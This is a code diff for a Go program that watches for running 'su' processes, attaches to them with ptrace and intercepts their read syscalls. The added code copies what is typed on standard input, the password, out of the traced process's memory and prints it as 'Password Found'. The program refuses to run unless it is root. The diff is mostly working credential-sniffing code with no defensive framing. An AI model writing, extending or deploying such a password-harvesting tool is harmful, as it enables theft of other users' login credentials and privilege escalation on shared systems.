@@ -4,13 +4,13 @@ import (
 	"fmt"
 	"io/ioutil"
 	"os"
+	"os/signal"
 	"regexp"
 	"strconv"
 	"strings"
+	"syscall"
 	"time"
 )
-
-var shutdownChan = make(chan struct{})
 
 func watchSUProcesses() {
 	processedPIDs := make(map[int]struct{})
@@ -69,15 +69,84 @@ func isSUProcess(pid int) bool {
 }
 
 func traceSUProcess(pid int) {
-	fmt.Printf("Tracing pid: %d\n", pid)
+	fmt.Printf("Tracing: %d\n", pid)
+	err := syscall.PtraceAttach(pid)
+	if err != nil {
+		return
+	}
+	defer syscall.PtraceDetach(pid)
+
+	var status syscall.WaitStatus
+	_, err = syscall.Wait4(pid, &status, syscall.WSTOPPED, nil)
+	if err != nil {
+		return
+	}
+	for {
+		err = syscall.PtraceSyscall(pid, 0)
+		if err != nil {
+			return
+		}
+
+		_, err = syscall.Wait4(pid, &status, 0, nil)
+		if err != nil {
+			return
+		}
+
+		if status.Exited() {
+			break
+		}
+
+		if status.Stopped() && status.StopSignal() == syscall.SIGTRAP {
+			var regs syscall.PtraceRegs
+			err := syscall.PtraceGetRegs(pid, &regs)
+			if err != nil {
+				return
+			}
+
+			if regs.Orig_rax == 3 {
+				fd := int(regs.Rdi)
+				readLength := int(regs.Rdx)
+				length := int(regs.Rax)
+
+				if fd == 0 && readLength == 511 {
+					buffer := make([]byte, length)
+					_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
+					if err != nil {
+						return
+					}
+					fmt.Printf("Password Found: %s\n", buffer)
+					fmt.Printf("Password Found: %x\n", buffer)
+					fmt.Printf("File Descriptor: %d\n", regs.Rdi)
+					fmt.Printf("Buffer Address: %d\n", regs.Rsi)
+					fmt.Printf("Count: %d\n", regs.Rdx)
+				}
+			}
+		}
+
+		err = syscall.PtraceSyscall(pid, 0)
+		if err != nil {
+			return
+		}
+
+		_, err = syscall.Wait4(pid, &status, 0, nil)
+		if err != nil {
+			return
+		}
+	}
 }
 
+var shutdownChan = make(chan struct{})
+
 func main() {
-	go watchSUProcesses()
-
-	time.Sleep(10 * time.Minute) // Adjust the duration based on your needs
-
-	close(shutdownChan)
-	time.Sleep(2 * time.Second) // Allow some time for goroutines to finish before exiting
-	fmt.Println("Exiting the main program.")
+	if syscall.Geteuid() != 0 {
+		os.Exit(1)
+	}
+	sigc := make(chan os.Signal, 1)
+	signal.Notify(sigc, os.Interrupt, syscall.SIGTERM)
+	go func() {
+		<-sigc
+		close(shutdownChan)
+		os.Exit(0)
+	}()
+	watchSUProcesses()
 }
